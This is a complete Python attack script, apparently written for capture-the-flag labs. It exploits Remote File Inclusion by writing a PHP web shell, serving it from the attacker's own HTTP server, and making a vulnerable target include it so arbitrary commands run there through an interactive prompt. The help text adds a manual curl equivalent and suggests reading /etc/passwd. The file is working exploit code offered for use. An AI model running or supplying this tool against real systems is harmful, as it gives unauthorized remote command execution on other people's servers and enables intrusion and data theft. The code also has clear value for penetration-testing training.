#!/usr/bin/env python3
"""
Simple RFI (Remote File Inclusion) Shell
Automatically hosts your web shell and executes commands
"""

import requests
import argparse
import sys
import subprocess
import time
import threading
import socket
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import quote_plus
import os
import tempfile
import shutil

class QuietHTTPRequestHandler(SimpleHTTPRequestHandler):
    """HTTP handler that logs to a file instead of console"""
    def log_message(self, format, *args):
        # Log to file instead of stderr
        with open('/tmp/rfi_server.log', 'a') as f:
            f.write(f"{self.address_string()} - {format % args}\n")

class RFIShell:
    """Remote File Inclusion Shell with automatic server setup"""
    
    def __init__(self, target, param, your_ip=None, your_port=8000, 
                 shell_file=None, method='http', verbose=False):
        self.target = self.normalize_url(target)
        self.param = param
        self.your_ip = your_ip or self.detect_tun0_ip()
        self.your_port = your_port
        self.method = method
        self.verbose = verbose
        self.shell_file = shell_file
        self.temp_dir = None
        self.server = None
        self.server_thread = None
        
        # Colors
        self.RED = '\033[91m'
        self.GREEN = '\033[92m'
        self.YELLOW = '\033[93m'
        self.BLUE = '\033[94m'
        self.RESET = '\033[0m'
    
    def normalize_url(self, url):
        """Add http:// if missing"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url
    
    def detect_tun0_ip(self):
        """Auto-detect tun0 IP address"""
        try:
            # Try ip command first (Linux)
            result = subprocess.run(['ip', 'addr', 'show', 'tun0'], 
                                  capture_output=True, text=True, timeout=2)
            
            if result.returncode == 0:
                # Parse output for inet address
                for line in result.stdout.split('\n'):
                    if 'inet ' in line and 'scope global' in line:
                        # Extract IP: "inet 10.10.15.254/23 scope global tun0"
                        parts = line.strip().split()
                        ip_with_mask = parts[1]
                        ip = ip_with_mask.split('/')[0]
                        print(f"{self.GREEN}[+] Auto-detected tun0 IP: {ip}{self.RESET}")
                        return ip
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        # Fallback: try to get any non-loopback IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            print(f"{self.YELLOW}[*] Could not detect tun0, using: {ip}{self.RESET}")
            return ip
        except:
            print(f"{self.RED}[!] Could not auto-detect IP address{self.RESET}")
            print(f"{self.YELLOW}[*] Please specify with --your-ip{self.RESET}")
            sys.exit(1)
    
    def create_default_shell(self):
        """Create a default web shell"""
        return "<?php system($_GET['cmd']); ?>"
    
    def create_advanced_shell(self):
        """Create a more advanced web shell with error handling"""
        return """<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    echo "Command: " . htmlspecialchars($cmd) . "\\n";
    echo "---\\n";
    system($cmd . " 2>&1");
    echo "</pre>";
} else {
    echo "Usage: ?cmd=command";
}
?>"""
    
    def setup_web_shell(self):
        """Create and setup the web shell file"""
        # Create temporary directory
        self.temp_dir = tempfile.mkdtemp(prefix='rfi_')
        
        if self.shell_file and os.path.exists(self.shell_file):
            # Use provided shell file
            shell_path = os.path.join(self.temp_dir, 'shell.php')
            shutil.copy(self.shell_file, shell_path)
            print(f"{self.GREEN}[+] Using custom shell: {self.shell_file}{self.RESET}")
        else:
            # Create default shell
            shell_path = os.path.join(self.temp_dir, 'shell.php')
            with open(shell_path, 'w') as f:
                f.write(self.create_default_shell())
            print(f"{self.GREEN}[+] Created default web shell{self.RESET}")
        
        return shell_path
    
    def start_http_server(self):
        """Start HTTP server in background thread"""
        os.chdir(self.temp_dir)
        
        def run_server():
            self.server = HTTPServer(('0.0.0.0', self.your_port), QuietHTTPRequestHandler)
            self.server.serve_forever()
        
        self.server_thread = threading.Thread(target=run_server, daemon=True)
        self.server_thread.start()
        
        # Give server time to start
        time.sleep(0.5)
        
        print(f"{self.GREEN}[+] HTTP server started on {self.your_ip}:{self.your_port}{self.RESET}")
    
    def stop_http_server(self):
        """Stop HTTP server"""
        if self.server:
            self.server.shutdown()
        if self.temp_dir and os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
    
    def build_rfi_url(self, command):
        """Build the RFI URL"""
        # Build URL to your shell
        if self.method == 'http':
            shell_url = f"http://{self.your_ip}:{self.your_port}/shell.php"
        elif self.method == 'ftp':
            shell_url = f"ftp://{self.your_ip}/shell.php"
        elif self.method == 'smb':
            shell_url = f"\\\\{self.your_ip}\\share\\shell.php"
        else:
            shell_url = f"http://{self.your_ip}:{self.your_port}/shell.php"
        
        # URL encode command
        cmd_encoded = quote_plus(command)
        
        # Build full URL
        separator = '&' if '?' in self.target else '?'
        url = f"{self.target}{separator}{self.param}={shell_url}&cmd={cmd_encoded}"
        
        return url
    
    def filter_html(self, text):
        """Filter out HTML tags like grep -v '<.*>'"""
        lines = text.split('\n')
        filtered = []
        
        for line in lines:
            # Skip lines containing < or >
            if '<' not in line and '>' not in line:
                stripped = line.strip()
                if stripped:
                    filtered.append(stripped)
        
        return '\n'.join(filtered)
    
    def execute_command(self, command):
        """Execute a command via RFI"""
        url = self.build_rfi_url(command)
        
        if self.verbose:
            print(f"{self.BLUE}[DEBUG] URL: {url}{self.RESET}\n")
        
        try:
            response = requests.get(url, timeout=10)
            
            if response.status_code != 200:
                return None, f"HTTP {response.status_code}"
            
            # Filter HTML
            filtered = self.filter_html(response.text)
            return filtered, None
            
        except Exception as e:
            return None, str(e)
    
    def test_connection(self):
        """Test if RFI is working"""
        print(f"{self.YELLOW}[*] Testing RFI connection...{self.RESET}")
        
        output, error = self.execute_command('id')
        
        if error:
            print(f"{self.RED}[!] Error: {error}{self.RESET}")
            return False
        
        if output and ('uid=' in output or 'gid=' in output):
            print(f"{self.GREEN}[+] RFI successful!{self.RESET}")
            print(f"{self.GREEN}[+] Output:{self.RESET}\n{output}\n")
            return True
        else:
            print(f"{self.RED}[!] Could not verify RFI{self.RESET}")
            if output:
                print(f"{self.YELLOW}[*] Response:{self.RESET}\n{output}\n")
            return False
    
    def interactive_shell(self):
        """Run interactive shell"""
        print(f"\n{self.GREEN}{'='*70}{self.RESET}")
        print(f"{self.GREEN}RFI Interactive Shell{self.RESET}")
        print(f"{self.GREEN}{'='*70}{self.RESET}")
        print(f"Target:     {self.target}")
        print(f"Parameter:  {self.param}")
        print(f"Your IP:    {self.your_ip}")
        print(f"Your Port:  {self.your_port}")
        print(f"Method:     {self.method}")
        print(f"{self.GREEN}{'='*70}{self.RESET}\n")
        
        # Setup and start server
        self.setup_web_shell()
        self.start_http_server()
        
        # Test connection
        if not self.test_connection():
            response = input(f"\n{self.YELLOW}RFI test failed. Continue? (y/n): {self.RESET}")
            if response.lower() != 'y':
                self.stop_http_server()
                return
        
        print(f"{self.YELLOW}Type 'exit' to quit, 'help' for commands{self.RESET}\n")
        
        try:
            while True:
                try:
                    cmd = input(f"{self.BLUE}rfi>{self.RESET} ").strip()
                    
                    if not cmd:
                        continue
                    
                    if cmd.lower() in ['exit', 'quit']:
                        print(f"\n{self.YELLOW}[*] Exiting...{self.RESET}")
                        break
                    
                    if cmd.lower() == 'help':
                        self.print_help()
                        continue
                    
                    if cmd.lower() == 'clear':
                        os.system('clear' if sys.platform != 'win32' else 'cls')
                        continue
                    
                    # Execute command
                    output, error = self.execute_command(cmd)
                    
                    if error:
                        print(f"{self.RED}[!] Error: {error}{self.RESET}")
                    elif output:
                        print(output)
                    else:
                        print(f"{self.YELLOW}[*] No output{self.RESET}")
                    
                    print()
                    
                except KeyboardInterrupt:
                    print(f"\n{self.YELLOW}[*] Use 'exit' to quit{self.RESET}")
                    continue
                except EOFError:
                    print(f"\n{self.YELLOW}[*] Exiting...{self.RESET}")
                    break
        finally:
            self.stop_http_server()
    
    def print_help(self):
        """Print help"""
        print(f"\n{self.GREEN}Commands:{self.RESET}")
        print(f"  exit, quit  - Exit shell")
        print(f"  help        - Show this help")
        print(f"  clear       - Clear screen")
        print(f"  <command>   - Execute system command")
        
        print(f"\n{self.GREEN}Useful Commands:{self.RESET}")
        print(f"  id                  - Current user")
        print(f"  pwd                 - Current directory")
        print(f"  ls -la              - List files")
        print(f"  cat /etc/passwd     - Read files")
        print(f"  find / -name flag.txt 2>/dev/null")
        print()

def main():
    parser = argparse.ArgumentParser(
        description='Simple RFI Shell with automatic server setup',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Interactive shell (auto-detects tun0 IP)
  %(prog)s 10.129.29.114/index.php -i

  # Single command
  %(prog)s 10.129.29.114/index.php -c "ls /"

  # Specify your IP and port
  %(prog)s 10.129.29.114/index.php -i --your-ip 10.10.15.254 --your-port 8000

  # Use custom web shell
  %(prog)s 10.129.29.114/index.php -i --shell myshell.php

  # Different parameter name
  %(prog)s target.com/page.php -p file -c "id"

  # Verbose mode
  %(prog)s 10.129.29.114/index.php -c "id" -v

How it works:
  1. Auto-detects your tun0 IP address
  2. Creates/hosts a web shell on HTTP server (port 8000)
  3. Makes target include: http://YOUR_IP:8000/shell.php
  4. Executes commands via ?cmd=parameter
  5. Filters HTML output

Manual equivalent:
  echo '<?php system($_GET["cmd"]); ?>' > shell.php
  python3 -m http.server 8000
  curl 'http://TARGET/index.php?language=http://YOUR_IP:8000/shell.php&cmd=id'
        """
    )
    
    parser.add_argument('target',
                       help='Target URL (e.g., 10.129.29.114/index.php)')
    parser.add_argument('-p', '--param', default='language',
                       help='Vulnerable parameter (default: language)')
    parser.add_argument('-c', '--command',
                       help='Single command to execute')
    parser.add_argument('-i', '--interactive', action='store_true',
                       help='Interactive shell mode')
    parser.add_argument('--your-ip',
                       help='Your IP address (auto-detects tun0 if not specified)')
    parser.add_argument('--your-port', type=int, default=8000,
                       help='Your HTTP server port (default: 8000)')
    parser.add_argument('--shell',
                       help='Path to custom web shell PHP file')
    parser.add_argument('-m', '--method', default='http',
                       choices=['http', 'ftp', 'smb'],
                       help='Include method (default: http)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    
    args = parser.parse_args()
    
    # Create shell instance
    shell = RFIShell(
        args.target,
        args.param,
        your_ip=args.your_ip,
        your_port=args.your_port,
        shell_file=args.shell,
        method=args.method,
        verbose=args.verbose
    )
    
    if args.interactive:
        shell.interactive_shell()
    elif args.command:
        # Single command mode
        shell.setup_web_shell()
        shell.start_http_server()
        
        try:
            print(f"{shell.YELLOW}[*] Executing: {args.command}{shell.RESET}\n")
            
            output, error = shell.execute_command(args.command)
            
            if error:
                print(f"{shell.RED}[!] Error: {error}{shell.RESET}")
                sys.exit(1)
            elif output:
                print(output)
            else:
                print(f"{shell.YELLOW}[*] No output{shell.RESET}")
        finally:
            shell.stop_http_server()
    else:
        parser.print_help()
        print(f"\n{shell.RED}[!] Must specify -i (interactive) or -c (command){shell.RESET}")
        sys.exit(1)

if __name__ == '__main__':
    main()